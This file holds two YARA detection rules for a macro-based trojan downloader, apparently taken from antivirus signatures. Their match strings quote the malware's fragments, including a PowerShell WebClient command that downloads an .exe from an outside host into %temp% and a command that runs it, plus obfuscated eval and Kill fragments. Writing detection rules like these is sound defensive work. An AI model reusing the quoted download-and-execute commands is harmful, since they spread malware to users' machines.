
rule TrojanDownloader_O97M_Obfuse_UA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.UA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {6e 65 77 2d 6f 62 6a 65 63 22 20 26 20 22 74 22 20 26 20 22 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 3b 24 63 6c 69 65 6e 74 2e 44 6f 77 6e 6c 6f 61 64 46 69 6c 65 28 27 68 74 74 70 3a 2f 2f 6c 6f 69 73 6e 66 65 72 6e 61 6e 64 65 7a 2e 75 73 2f 47 6f 6c 64 2f 61 61 66 69 6c 65 2e 65 78 65 27 2c 27 22 20 26 20 22 25 22 20 26 20 22 74 65 6d 70 22 20 26 20 22 25 22 20 26 20 22 5c 75 71 66 65 62 61 2e 65 78 65 27 29 } //1 new-objec" & "t" & " System.Net.WebClient;$client.DownloadFile('http://loisnfernandez.us/Gold/aafile.exe','" & "%" & "temp" & "%" & "\uqfeba.exe')
		$a_01_1 = {73 74 61 72 74 20 22 20 26 20 22 25 22 20 26 20 22 74 65 6d 70 22 20 26 20 22 25 22 20 26 20 22 5c 75 71 66 65 62 61 2e 65 78 65 22 } //1 start " & "%" & "temp" & "%" & "\uqfeba.exe"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_Obfuse_UA_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.UA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {2e 46 69 6c 65 45 78 69 73 74 73 28 61 66 65 64 62 62 64 65 63 62 63 63 61 20 2b 20 27 2f 27 20 2b 20 27 65 62 62 61 62 63 62 65 66 65 62 2e 74 78 74 27 29 } //1 .FileExists(afedbbdecbcca + '/' + 'ebbabcbefeb.txt')
		$a_01_1 = {69 73 46 69 6e 69 74 65 28 65 61 64 61 62 61 63 63 66 64 64 66 62 63 29 } //1 isFinite(eadabaccfddfbc)
		$a_01_2 = {57 53 63 72 69 70 74 2e 51 75 69 74 28 29 } //1 WScript.Quit()
		$a_01_3 = {65 76 61 6c 28 66 66 63 65 63 65 61 62 61 66 64 62 65 62 29 } //1 eval(ffceceabafdbeb)
		$a_01_4 = {2e 6a 6f 69 6e 28 27 27 29 2e 72 65 70 6c 61 63 65 28 27 2f 2a 27 2c 27 27 29 } //1 .join('').replace('/*','')
		$a_01_5 = {4b 69 6c 6c 20 43 53 74 72 28 65 61 63 66 66 61 64 65 65 62 63 63 66 65 62 66 63 65 65 64 62 62 61 61 61 66 61 62 61 63 66 63 65 64 61 5f 64 63 65 63 65 64 61 62 62 63 62 66 61 61 61 5f 64 64 61 61 65 66 63 61 63 62 64 66 62 64 65 62 63 66 64 66 62 65 63 63 65 63 65 63 63 61 66 64 63 62 28 29 29 } //1 Kill CStr(eacffadeebccfebfceedbbaaafabacfceda_dcecedabbcbfaaa_ddaaefcacbdfbdebcfdfbeccececcafdcb())
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}